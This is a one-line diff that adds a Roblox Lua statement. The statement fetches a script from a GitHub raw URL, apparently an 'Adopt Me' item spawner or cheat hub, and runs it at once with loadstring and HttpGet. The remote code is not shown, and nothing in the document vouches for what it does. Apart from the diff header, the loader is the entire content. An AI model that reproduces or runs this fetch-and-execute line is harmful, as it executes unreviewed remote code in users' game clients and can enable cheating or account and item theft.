@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xxcrn/adopte-spawner/refs/heads/main/adopthub"))()
